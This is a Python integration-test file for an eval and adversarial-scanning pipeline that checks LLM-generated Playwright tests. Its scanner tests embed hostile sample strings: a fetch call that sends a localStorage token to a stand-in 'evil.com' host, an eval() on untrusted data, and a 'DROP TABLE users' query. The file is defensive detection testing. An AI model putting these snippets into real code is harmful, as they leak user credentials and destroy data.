"""Integration tests: evals + adversarial pipeline stages with mocked LLM.

Tests the post-generation stages that run inside OrchestrationEngine.run_pipeline():
  - build_samples_from_pipeline() → run_evals() → EvalStore.save()
  - run_adversarial_tests() → save_report()
  - Cross-module: synthetic data → evals bridge
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import patch


from cherenkov.adversarial.core import ThreatCategory
from cherenkov.adversarial.detector import scan_test_code
from cherenkov.adversarial.runner import run_adversarial_tests, save_report
from cherenkov.evals.core import EvalSample, EvalMetric
from cherenkov.evals.runner import build_samples_from_pipeline, run_evals
from cherenkov.evals.store import EvalStore


class TestPipelineEvalsIntegration:
    """Tests the evals pipeline stage: build_samples -> run_evals -> store."""

    def test_build_samples_from_pipeline(
        self, mock_scenarios, mock_gen_outputs, mock_spec_summaries
    ):
        """build_samples_from_pipeline correctly bridges PLAN + GENERATE output."""
        samples = build_samples_from_pipeline(
            mock_scenarios, mock_gen_outputs, mock_spec_summaries
        )
        assert len(samples) == 3
        ids = {s.scenario_id for s in samples}
        assert ids == {"users_list", "users_create", "admin_bypass"}

    def test_build_samples_skips_missing_gen_output(
        self, mock_scenarios, mock_spec_summaries
    ):
        """Scenarios with no matching gen output are skipped."""
        samples = build_samples_from_pipeline(mock_scenarios, {}, mock_spec_summaries)
        assert len(samples) == 0

    def test_build_samples_attaches_spec_summary(
        self, mock_scenarios, mock_gen_outputs, mock_spec_summaries
    ):
        """Spec summaries are correctly attached to each sample."""
        samples = build_samples_from_pipeline(
            mock_scenarios, mock_gen_outputs, mock_spec_summaries
        )
        sample_map = {s.scenario_id: s for s in samples}
        assert sample_map["users_list"].spec_summary == "Returns a list of users"
        assert (
            sample_map["users_create"].spec_summary
            == "Creates a new user and returns 201"
        )

    def test_run_evals_with_mocked_llm(
        self, mock_llm_client, mock_scenarios, mock_gen_outputs, mock_spec_summaries
    ):
        """run_evals produces a valid report with mocked LLM."""
        samples = build_samples_from_pipeline(
            mock_scenarios, mock_gen_outputs, mock_spec_summaries
        )
        report = run_evals(samples)
        assert report.pass_rate() >= 0
        assert len(report.results) == 3
        for result in report.results:
            assert len(result.scores) == 5
            assert all(s.metric in EvalMetric for s in result.scores)
            assert result.duration_ms >= 0

    def test_run_evals_llm_failure_fallback(
        self, mock_scenarios, mock_gen_outputs, mock_spec_summaries
    ):
        """When LLM fails, run_evals returns ERROR results instead of crashing."""
        samples = build_samples_from_pipeline(
            mock_scenarios, mock_gen_outputs, mock_spec_summaries
        )
        with patch(
            "cherenkov.evals.judge.get_client",
            side_effect=RuntimeError("LLM unavailable"),
        ):
            report = run_evals(samples)
        assert len(report.results) == 3
        for result in report.results:
            assert result.error is not None

    def test_eval_store_save_and_retrieve(
        self,
        tmp_path,
        mock_scenarios,
        mock_gen_outputs,
        mock_spec_summaries,
        mock_llm_client,
    ):
        """EvalStore.save() persists a report that can be retrieved."""
        samples = build_samples_from_pipeline(
            mock_scenarios, mock_gen_outputs, mock_spec_summaries
        )
        report = run_evals(samples)

        db_path = tmp_path / "evals.db"
        store = EvalStore(db_path=db_path)
        store.save(report)

        latest = store.latest()
        assert latest is not None
        assert latest["pass_rate"] == report.pass_rate()
        assert latest["total"] == 3

    def test_eval_store_history(
        self,
        tmp_path,
        mock_scenarios,
        mock_gen_outputs,
        mock_spec_summaries,
        mock_llm_client,
    ):
        """Multiple reports can be stored and retrieved via history()."""
        samples = build_samples_from_pipeline(
            mock_scenarios, mock_gen_outputs, mock_spec_summaries
        )
        report1 = run_evals(samples)
        report2 = run_evals(samples)

        db_path = tmp_path / "evals.db"
        store = EvalStore(db_path=db_path)
        store.save(report1)
        store.save(report2)

        history = store.history(limit=5)
        assert len(history) >= 2


class TestPipelineAdversarialIntegration:
    """Tests the adversarial pipeline stage: scan -> report -> save."""

    def test_adversarial_scan_clean_code(self):
        """Clean test code produces no findings."""
        code = """
import { test, expect } from '@playwright/test';
import { createClient } from '../client';
test('happy path', async () => {
  const client = createClient();
  const res = await client.GET('/users');
  expect(res.status).toBe(200);
});
"""
        detections = scan_test_code(code)
        assert all(not d.detected for d in detections)

    def test_adversarial_scan_detects_eval_injection(self):
        """Test code with eval() is flagged as command injection."""
        code = """
const data = eval('(' + response + ')');
"""
        detections = scan_test_code(code)
        cmd_inj = [
            d
            for d in detections
            if d.detected and d.category == ThreatCategory.COMMAND_INJECTION
        ]
        assert len(cmd_inj) >= 1

    def test_adversarial_scan_detects_data_exfil(self):
        """Test code with data exfiltration patterns is flagged."""
        code = """
const token = await page.evaluate(() => localStorage.getItem('token'));
await fetch('https://evil.com/steal?token=' + token);
"""
        detections = scan_test_code(code)
        exfil = [
            d
            for d in detections
            if d.detected and d.category == ThreatCategory.DATA_EXFILTRATION
        ]
        assert len(exfil) >= 1

    def test_adversarial_scan_detects_spec_manipulation(self):
        """Test code with DROP TABLE is flagged as spec manipulation."""
        code = """
await db.query("DROP TABLE users");
"""
        detections = scan_test_code(code)
        spec_manip = [
            d
            for d in detections
            if d.detected and d.category == ThreatCategory.SPEC_MANIPULATION
        ]
        assert len(spec_manip) >= 1

    def test_run_adversarial_tests_clean(self):
        """run_adversarial_tests on clean codes returns full-pass report."""
        test_codes = {
            "users_list": """
import { test, expect } from '@playwright/test';
import { createClient } from '../client';
test('list users', async () => {
  const client = createClient();
  const res = await client.GET('/users');
  expect(res.status).toBe(200);
});
"""
        }
        report = run_adversarial_tests(test_codes)
        assert report.pass_rate() == 1.0
        assert len(report.critical_findings()) == 0

    def test_run_adversarial_tests_detects_issues(self):
        """run_adversarial_tests detects issues across multiple test codes."""
        test_codes = {
            "clean": "const res = await client.GET('/users');",
            "injected": "eval(someUntrustedData);",
            "exfil": "fetch('https://evil.com/steal?token=' + token);",
        }
        report = run_adversarial_tests(test_codes)
        assert report.pass_rate() < 1.0
        # Results: 3 clean-check entries + 1 eval detection + 1 exfil detection
        assert len(report.results) >= 3

    def test_save_report(self, tmp_path):
        """save_report writes a JSON file."""
        test_codes = {"test": "const x = 1;"}
        report = run_adversarial_tests(test_codes)
        output = tmp_path / "adv_report.json"
        path = save_report(report, output_path=str(output))
        assert Path(path).exists()
        data = json.loads(Path(path).read_text())
        assert "pass_rate" in data
        assert "results" in data


class TestCrossModuleSyntheticToEvals:
    """Tests bridging synthetic data generation output into the evals pipeline."""

    def test_synthetic_data_as_eval_samples(self, mock_openapi_spec, mock_llm_client):
        """Synthetic generator output can be wrapped into EvalSamples."""
        from cherenkov.synthetic.generator import generate_from_spec

        data = generate_from_spec(str(mock_openapi_spec))

        samples = []
        for route_key, route_data in data.items():
            method, _, path = route_key.partition(" ")
            scenario_id = f"synthetic_{method}_{path.replace('/', '_')}"
            code = _build_fake_test_code(method, path, route_data)
            samples.append(
                EvalSample(
                    scenario_id=scenario_id,
                    endpoint=path,
                    method=method,
                    expected_status=201 if method == "POST" else 200,
                    test_code=code,
                    spec_summary=f"Synthetic test for {method} {path}",
                )
            )

        assert len(samples) > 0
        report = run_evals(samples)
        assert len(report.results) == len(samples)
        assert report.pass_rate() >= 0

    def test_synthetic_evals_with_bad_code(self, mock_openapi_spec, mock_llm_client):
        """Evals structure is correct even for poor test code."""
        samples = [
            EvalSample(
                scenario_id="bad_synthetic",
                endpoint="/users",
                method="POST",
                expected_status=201,
                test_code="test('bad', async () => { const res = await fetch('/users'); console.log(res); });",
                spec_summary="Create user",
            )
        ]
        report = run_evals(samples)
        assert len(report.results) == 1
        assert report.results[0].sample.scenario_id == "bad_synthetic"


class TestCombinedPipelineStages:
    """Tests that evals + adversarial can run sequentially as in the real pipeline."""

    def test_evals_then_adversarial_sequential(
        self, mock_llm_client, mock_generated_tests
    ):
        """Simulate the orchestrator's evals -> adversarial flow."""
        test_files = sorted(mock_generated_tests.glob("*.spec.ts"))
        assert len(test_files) == 3

        test_codes = {}
        samples = []
        for tf in test_files:
            code = tf.read_text(encoding="utf-8")
            scenario_id = tf.stem
            test_codes[scenario_id] = code
            samples.append(
                EvalSample(
                    scenario_id=scenario_id,
                    endpoint="/test",
                    method="GET",
                    expected_status=200,
                    test_code=code,
                    spec_summary="Test endpoint",
                )
            )

        report = run_evals(samples)
        assert len(report.results) == 3

        adv_report = run_adversarial_tests(test_codes)
        assert adv_report.pass_rate() <= 1.0
        # admin_bypass test has 'OR 1=1 which may or may not match patterns;
        # what matters is scan runs without error
        assert len(adv_report.results) > 0

    def test_env_var_gating(self):
        """Verify the env-var gating logic used by the orchestrator."""
        import os

        os.environ.pop("CHERENKOV_EVALS_ENABLED", None)
        assert os.getenv("CHERENKOV_EVALS_ENABLED", "0") == "0"

        os.environ.pop("CHERENKOV_ADVERSARIAL_ENABLED", None)
        assert os.getenv("CHERENKOV_ADVERSARIAL_ENABLED", "0") == "0"

        os.environ["CHERENKOV_EVALS_ENABLED"] = "1"
        os.environ["CHERENKOV_ADVERSARIAL_ENABLED"] = "1"
        assert os.getenv("CHERENKOV_EVALS_ENABLED", "0") == "1"
        assert os.getenv("CHERENKOV_ADVERSARIAL_ENABLED", "0") == "1"


def _build_fake_test_code(method: str, path: str, data: dict) -> str:
    """Build a plausible test code string from synthetic data."""
    body = data.get("request_body", {})
    return f"""
import {{ test, expect }} from '@playwright/test';
import {{ createClient }} from '../client';

test('{method} {path}', async () => {{
  const client = createClient();
  const req_body = {json.dumps(body)};
  const res = await client.{method}('{path}', {{ body: req_body }});
  expect(res.status).toBe({201 if method == 'POST' else 200});
}});
"""
